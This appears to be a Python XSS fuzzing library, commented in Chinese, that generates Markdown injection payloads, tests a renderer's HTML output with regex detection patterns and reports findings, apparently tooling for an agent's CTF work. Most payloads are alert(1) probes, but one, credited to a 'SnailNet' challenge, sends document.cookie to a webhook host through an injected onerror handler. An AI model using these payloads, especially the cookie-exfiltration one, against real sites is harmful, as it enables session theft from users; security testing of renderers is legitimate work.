"""summary: Markdown 解析器 XSS 注入系统化测试工具

description:
  对目标应用的 Markdown 渲染功能进行系统化 XSS 注入测试。

  测试覆盖：
  1. HTML 混合模式（直接 HTML 标签注入）
  2. 图片语法边界（alt 文本注入、URL 属性注入）
  3. 链接语法边界（title 注入、href 协议注入）
  4. 嵌套/非标准结构（解析器边界情况）
  5. decode-then-reprocess 模式检测（PHP htmlspecialchars_decode 漏洞）

  支持两种测试模式：
  - 本地模式：直接调用函数测试 Markdown → HTML 转换
  - 远程模式：通过 HTTP 请求测试目标 URL 的 Markdown 渲染

  依赖: requests, beautifulsoup4（远程模式需要）

  调用方式:
    import sys
    sys.path.insert(0, "$AGENT_DIR/scripts")
    from markdown_fuzz import MarkdownFuzzer, PayloadCategory

usage:
  作为库模块被 import，也可以直接运行进行远程测试。

level: intermediate
"""

import re
import enum
from dataclasses import dataclass, field
from typing import Optional, Callable, List, Dict


class PayloadCategory(enum.Enum):
    """XSS 注入类型分类"""
    HTML_MIX = "html_mix"                    # HTML 混合模式
    IMG_ALT_INJECT = "img_alt_inject"        # 图片 alt 属性注入
    IMG_URL_INJECT = "img_url_inject"        # 图片 URL 属性注入（核心！）
    LINK_TITLE_INJECT = "link_title_inject"  # 链接 title 属性注入
    LINK_HREF_INJECT = "link_href_inject"    # 链接 href 协议注入
    NESTED_STRUCTURE = "nested_structure"    # 嵌套/非标准结构
    DECODE_REPROCESS = "decode_reprocess"    # decode-then-reprocess 模式
    CODE_BLOCK_ESCAPE = "code_block_escape"  # 代码块逃逸


@dataclass
class FuzzPayload:
    """单个测试 payload"""
    category: PayloadCategory
    name: str
    markdown: str
    description: str
    expected_danger: str = ""  # 期望在 HTML 中出现的危险字符串
    severity: str = "medium"   # low / medium / high


@dataclass
class FuzzResult:
    """单个测试结果"""
    payload: FuzzPayload
    rendered_html: str
    is_vulnerable: bool
    evidence: str = ""  # 证明漏洞存在的 HTML 片段


def generate_payloads(webhook_url: str = "https://webhook.site/TEST_UUID") -> List[FuzzPayload]:
    """生成所有测试 payload。

    Args:
        webhook_url: 用于外泄测试的 webhook URL

    Returns:
        FuzzPayload 列表
    """
    payloads = []

    # ── 1. HTML 混合模式 ──────────────────────────────────────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.HTML_MIX,
            name="img_onerror_basic",
            markdown='<img src=x onerror=alert(1)>',
            description="基础 HTML 混合：img 标签 + onerror 事件",
            expected_danger="onerror=alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.HTML_MIX,
            name="script_tag",
            markdown='<script>alert(1)</script>',
            description="HTML 混合：script 标签",
            expected_danger="<script>alert(1)</script>",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.HTML_MIX,
            name="svg_onload",
            markdown='<svg onload=alert(1)>',
            description="HTML 混合：svg 标签 + onload 事件",
            expected_danger="onload=alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.HTML_MIX,
            name="body_onload",
            markdown='<body onload=alert(1)>',
            description="HTML 混合：body 标签 + onload 事件",
            expected_danger="onload=alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.HTML_MIX,
            name="bold_test",
            markdown='<b>test</b>',
            description="HTML 混合检测：简单的 b 标签（无害，用于判断 HTML 混合是否开启）",
            expected_danger="<b>test</b>",
            severity="low",
        ),
    ])

    # ── 2. 图片 alt 属性注入 ──────────────────────────────────────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.IMG_ALT_INJECT,
            name="img_alt_quote_escape",
            markdown='!["><script>alert(1)</script>](https://example.com/img.png)',
            description="图片 alt 属性：双引号逃逸 + script 注入",
            expected_danger="<script>alert(1)</script>",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.IMG_ALT_INJECT,
            name="img_alt_onerror",
            markdown='![" onerror="alert(1)](https://example.com/img.png)',
            description="图片 alt 属性：双引号逃逸 + onerror 属性注入",
            expected_danger='onerror="alert(1)"',
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.IMG_ALT_INJECT,
            name="img_alt_event_handler",
            markdown="![x](https://example.com/img.png 'title' onerror='alert(1)')",
            description="图片 URL 后注入 onerror 属性（单引号）",
            expected_danger="onerror='alert(1)'",
            severity="high",
        ),
    ])

    # ── 3. 图片 URL 属性注入（核心！SnailNet 题目发现的技术）──────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.IMG_URL_INJECT,
            name="url_attribute_inject_basic",
            markdown=f'![[x]({webhook_url}/?c=)]({webhook_url}//?dummy onerror=this.src=this.src+document.cookie x=)',
            description="嵌套图片语法 + URL 后注入 onerror 属性（SnailNet 核心技术）",
            expected_danger="onerror=",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.IMG_URL_INJECT,
            name="url_space_inject_onerror",
            markdown='![alt](https://example.com/img.png onerror=alert(1))',
            description="URL 中空格后注入 onerror",
            expected_danger="onerror=alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.IMG_URL_INJECT,
            name="url_double_quote_inject",
            markdown='![alt](https://example.com/img.png" onerror="alert(1)")',
            description="URL 中双引号注入 onerror",
            expected_danger='onerror="alert(1)"',
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.IMG_URL_INJECT,
            name="url_space_inject_onload",
            markdown='![alt](https://example.com/img.png onload=alert(1))',
            description="URL 中空格后注入 onload",
            expected_danger="onload=alert(1)",
            severity="high",
        ),
    ])

    # ── 4. 链接 title 属性注入 ──────────────────────────────────────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.LINK_TITLE_INJECT,
            name="link_title_quote_escape",
            markdown='[link](https://example.com "title"><script>alert(1)</script>")',
            description="链接 title 属性：双引号逃逸 + script 注入",
            expected_danger="<script>alert(1)</script>",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.LINK_TITLE_INJECT,
            name="link_title_onclick",
            markdown='[link](https://example.com "title" onclick="alert(1)")',
            description="链接 title 后注入 onclick 属性",
            expected_danger='onclick="alert(1)"',
            severity="high",
        ),
    ])

    # ── 5. 链接 href 协议注入 ──────────────────────────────────────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.LINK_HREF_INJECT,
            name="link_javascript_protocol",
            markdown='[click](javascript:alert(1))',
            description="链接 href 使用 javascript: 协议",
            expected_danger="javascript:alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.LINK_HREF_INJECT,
            name="link_data_protocol",
            markdown='[click](data:text/html,<script>alert(1)</script>)',
            description="链接 href 使用 data: 协议",
            expected_danger="data:text/html",
            severity="medium",
        ),
    ])

    # ── 6. 嵌套/非标准结构 ──────────────────────────────────────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.NESTED_STRUCTURE,
            name="nested_img_link",
            markdown='[![alt](https://evil.com/x)](https://example.com)',
            description="图片嵌套在链接中",
            expected_danger="",
            severity="low",
        ),
        FuzzPayload(
            category=PayloadCategory.NESTED_STRUCTURE,
            name="unclosed_brackets",
            markdown='![alt](https://example.com/img.png onerror=alert(1',
            description="未闭合的括号（可能触发解析器异常行为）",
            expected_danger="onerror=",
            severity="medium",
        ),
        FuzzPayload(
            category=PayloadCategory.NESTED_STRUCTURE,
            name="double_bracket_nested",
            markdown=f'![[x](https://a.com)](https://b.com onerror=alert(1) x=)',
            description="双括号嵌套结构 + URL 属性注入",
            expected_danger="onerror=alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.NESTED_STRUCTURE,
            name="triple_nested",
            markdown=f'![![x](https://a.com)](https://b.com onerror=alert(1))',
            description="三层嵌套图片语法",
            expected_danger="onerror=",
            severity="medium",
        ),
        FuzzPayload(
            category=PayloadCategory.NESTED_STRUCTURE,
            name="url_with_newline",
            markdown='![alt](https://example.com/img.png\nonerror=alert(1))',
            description="URL 中换行符注入",
            expected_danger="onerror=",
            severity="medium",
        ),
    ])

    # ── 7. decode-then-reprocess 模式 ──────────────────────────────────
    # 当 Markdown 解析器先 htmlspecialchars → 再 htmlspecialchars_decode → 再正则处理时
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.DECODE_REPROCESS,
            name="encoded_onerror",
            markdown='![alt](https://example.com/img.png &amp;onerror=alert(1))',
            description="HTML 实体编码的 onerror（检测 decode-reprocess 模式）",
            expected_danger="onerror=alert(1)",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.DECODE_REPROCESS,
            name="encoded_script",
            markdown='![alt](https://example.com/img.png&amp;&lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;)',
            description="HTML 实体编码的 script 标签（检测 decode-reprocess 模式）",
            expected_danger="<script>alert(1)</script>",
            severity="high",
        ),
        FuzzPayload(
            category=PayloadCategory.DECODE_REPROCESS,
            name="double_encoding",
            markdown='![alt](https://example.com/img.png &amp;amp;onerror=alert(1))',
            description="双重 HTML 实体编码",
            expected_danger="onerror=",
            severity="medium",
        ),
    ])

    # ── 8. 代码块逃逸 ──────────────────────────────────────────
    payloads.extend([
        FuzzPayload(
            category=PayloadCategory.CODE_BLOCK_ESCAPE,
            name="inline_code_escape",
            markdown='`<img src=x onerror=alert(1)>`',
            description="内联代码中的 HTML 标签",
            expected_danger="<img src=x onerror=alert(1)>",
            severity="medium",
        ),
        FuzzPayload(
            category=PayloadCategory.CODE_BLOCK_ESCAPE,
            name="code_block_escape",
            markdown='```\n<img src=x onerror=alert(1)>\n```',
            description="代码块中的 HTML 标签",
            expected_danger="<img src=x onerror=alert(1)>",
            severity="medium",
        ),
    ])

    return payloads


class MarkdownFuzzer:
    """Markdown 解析器 XSS 注入测试工具。

    支持两种模式：
    1. 本地模式：传入 render_func 函数
    2. 远程模式：传入目标 URL 和渲染位置选择器
    """

    def __init__(
        self,
        render_func: Optional[Callable[[str], str]] = None,
        session=None,
        submit_url: Optional[str] = None,
        view_url_template: Optional[str] = None,
        csrf_url: Optional[str] = None,
        markdown_field: str = "content_markdown",
    ):
        """初始化。

        Args:
            render_func: 本地模式的 Markdown → HTML 转换函数
            session: requests.Session（远程模式）
            submit_url: 提交 Markdown 的 URL
            view_url_template: 查看渲染结果的 URL 模板
            csrf_url: 获取 CSRF token 的 URL
            markdown_field: POST 表单中 Markdown 内容的字段名
        """
        self.render_func = render_func
        self.session = session
        self.submit_url = submit_url
        self.view_url_template = view_url_template
        self.csrf_url = csrf_url
        self.markdown_field = markdown_field
        self.results: List[FuzzResult] = []

    def test_local(self, markdown: str) -> str:
        """本地模式：调用 render_func 渲染 Markdown。

        Args:
            markdown: Markdown 文本

        Returns:
            渲染后的 HTML
        """
        if not self.render_func:
            raise ValueError("本地模式需要提供 render_func")
        return self.render_func(markdown)

    def check_vulnerable(self, html: str, payload: FuzzPayload) -> tuple:
        """检查渲染后的 HTML 是否包含漏洞。

        Args:
            html: 渲染后的 HTML
            payload: 原始 payload

        Returns:
            (is_vulnerable, evidence) 元组
        """
        # 检查危险模式
        dangerous_patterns = [
            r'onerror\s*=\s*["\']?\s*alert\(',
            r'onload\s*=\s*["\']?\s*alert\(',
            r'onclick\s*=\s*["\']?\s*alert\(',
            r'onmouseover\s*=\s*["\']?\s*alert\(',
            r'<script[\s>]',
            r'javascript:\s*alert\(',
            r'onerror\s*=\s*["\']?\s*this\.src',
            r'onerror\s*=\s*["\']?\s*document\.cookie',
        ]

        for pattern in dangerous_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(html), match.end() + 50)
                evidence = html[start:end]
                return True, evidence

        # 检查 payload 特定的期望危险字符串
        if payload.expected_danger and payload.expected_danger in html:
            idx = html.find(payload.expected_danger)
            start = max(0, idx - 30)
            end = min(len(html), idx + len(payload.expected_danger) + 30)
            return True, html[start:end]

        return False, ""

    def run(
        self,
        webhook_url: str = "https://webhook.site/TEST_UUID",
        categories: Optional[List[PayloadCategory]] = None,
    ) -> List[FuzzResult]:
        """运行所有测试 payload。

        Args:
            webhook_url: 外泄测试的 webhook URL
            categories: 只测试这些分类（None = 全部测试）

        Returns:
            FuzzResult 列表
        """
        payloads = generate_payloads(webhook_url)

        if categories:
            payloads = [p for p in payloads if p.category in categories]

        self.results = []

        for i, payload in enumerate(payloads, 1):
            try:
                html = self.test_local(payload.markdown)
            except Exception as e:
                self.results.append(FuzzResult(
                    payload=payload,
                    rendered_html=f"ERROR: {e}",
                    is_vulnerable=False,
                ))
                continue

            is_vuln, evidence = self.check_vulnerable(html, payload)
            self.results.append(FuzzResult(
                payload=payload,
                rendered_html=html,
                is_vulnerable=is_vuln,
                evidence=evidence,
            ))

        return self.results

    def report(self) -> str:
        """生成测试报告。

        Returns:
            格式化的报告字符串
        """
        lines = []
        lines.append("=" * 70)
        lines.append("Markdown 解析器 XSS 注入测试报告")
        lines.append("=" * 70)

        # 统计
        total = len(self.results)
        vuln_count = sum(1 for r in self.results if r.is_vulnerable)
        lines.append(f"\n总测试: {total}  |  发现漏洞: {vuln_count}  |  安全: {total - vuln_count}")

        # 按分类汇总
        cat_stats: Dict[PayloadCategory, dict] = {}
        for r in self.results:
            cat = r.payload.category
            if cat not in cat_stats:
                cat_stats[cat] = {"total": 0, "vuln": 0}
            cat_stats[cat]["total"] += 1
            if r.is_vulnerable:
                cat_stats[cat]["vuln"] += 1

        lines.append("\n按分类统计:")
        lines.append("-" * 50)
        for cat, stats in cat_stats.items():
            status = "⚠ VULN" if stats["vuln"] > 0 else "✓ SAFE"
            lines.append(f"  {status}  {cat.value:25s}  {stats['vuln']}/{stats['total']}")

        # 漏洞详情
        vuln_results = [r for r in self.results if r.is_vulnerable]
        if vuln_results:
            lines.append("\n" + "=" * 70)
            lines.append("漏洞详情")
            lines.append("=" * 70)
            for r in vuln_results:
                lines.append(f"\n  [{r.payload.severity.upper()}] {r.payload.name}")
                lines.append(f"  分类: {r.payload.category.value}")
                lines.append(f"  描述: {r.payload.description}")
                lines.append(f"  Payload: {r.payload.markdown[:100]}...")
                lines.append(f"  证据: {r.evidence}")

        return "\n".join(lines)


def _check_html_mix_enabled(render_func: Callable) -> bool:
    """快速检测 HTML 混合模式是否开启。

    Args:
        render_func: Markdown → HTML 转换函数

    Returns:
        True 如果 HTML 混合模式开启
    """
    html = render_func("<b>test</b>")
    return "<b>test</b>" in html or "<strong>test</strong>" in html


if __name__ == "__main__":
    import sys

    print("=" * 70)
    print("Markdown 解析器 XSS 注入测试工具")
    print("=" * 70)
    print()
    print("用法:")
    print("  作为库模块导入:")
    print("    from markdown_fuzz import MarkdownFuzzer, generate_payloads")
    print("    fuzzer = MarkdownFuzzer(render_func=your_markdown_function)")
    print("    results = fuzzer.run()")
    print("    print(fuzzer.report())")
    print()
    print("  查看所有 payload:")
    print("    python markdown_fuzz.py --list")
    print()

    if "--list" in sys.argv:
        payloads = generate_payloads()
        print(f"共 {len(payloads)} 个 payload:\n")
        current_cat = None
        for p in payloads:
            if p.category != current_cat:
                current_cat = p.category
                print(f"\n--- {current_cat.value} ---")
            print(f"  [{p.severity:6s}] {p.name:35s}  {p.description}")
